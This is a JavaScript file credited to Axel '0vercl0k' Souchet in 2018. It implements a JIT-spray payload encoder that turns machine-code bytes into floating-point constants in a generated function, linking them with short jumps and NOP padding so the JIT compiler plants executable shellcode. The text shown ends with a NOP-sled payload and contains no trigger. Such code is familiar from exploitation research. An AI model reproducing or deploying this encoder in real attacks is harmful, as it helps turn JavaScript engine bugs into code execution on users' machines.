// Axel '0vercl0k' Souchet - 14 October 2018
const Debug = false;
let dbg = c => c;
if(Debug) {
    dbg = print;
}

function b2f(A) {
    if(A.length != 8) {
        throw 'Needs to be an 8 bytes long array';
    }

    const Bytes = new Uint8Array(A);
    const Doubles = new Float64Array(Bytes.buffer);
    return Doubles[0];
}

function gen_func_jitpayload(Payload) {
    const FunctionBody = ['function BringYourOwnPayload() {'];
    let CurrentStream = [];
    let Idx = 0;
    let Show = false;
    for(let Idx = 0; Idx < Payload.length; Idx++) {

        let CurrentInstr = Payload[Idx];
        let NextInstr = ((Idx + 1) >= Payload.length) ? null : Payload[Idx + 1];

        //
        // If we encounter an instruction bigger than 6 bytes we error out,
        // as we can't encode it (need 2bytes for jmp short).
        //

        const IsMagic = CurrentInstr.map(c => String.fromCharCode(c)).join('') == '0vercl0k';
        if(IsMagic) {
            Show = true;
        }

        if(!IsMagic && CurrentInstr.length > 6) {
            throw 'Cannot encode instructions bigger than 6 bytes @ ' + CurrentInstr;
        }

        //
        // Accumulate it!
        //

        for(const Byte of CurrentInstr) {
            CurrentStream.push(Byte);
        }

        if(Show) {
            dbg('[+] Accumulated ' + CurrentInstr.length + ' bytes');
        }

        //
        // Time to encode it!
        //

        if(!IsMagic) {
            const ToAdd = [0xEB, 0x09];
            const PaddingBytes = 8 - (CurrentStream.length + ToAdd.length);
            for(let _ = 0; _ < PaddingBytes; _++) {
                CurrentStream.unshift(0x90);
            }

            CurrentStream.push(...ToAdd);
        }

        const Cst = b2f(CurrentStream);
        FunctionBody.push('    const J' + Idx + ' = ' + Cst + ';');
        if(Show) {
            dbg('[+] Encoded ' + CurrentStream);
        }
        CurrentStream = [];
    }

    FunctionBody.push('}');
    return FunctionBody.join('\n');
}

const Payload = [];

for(let Idx = 0; Idx < 0x241; Idx++) {
    Payload.unshift([0x90]);
}

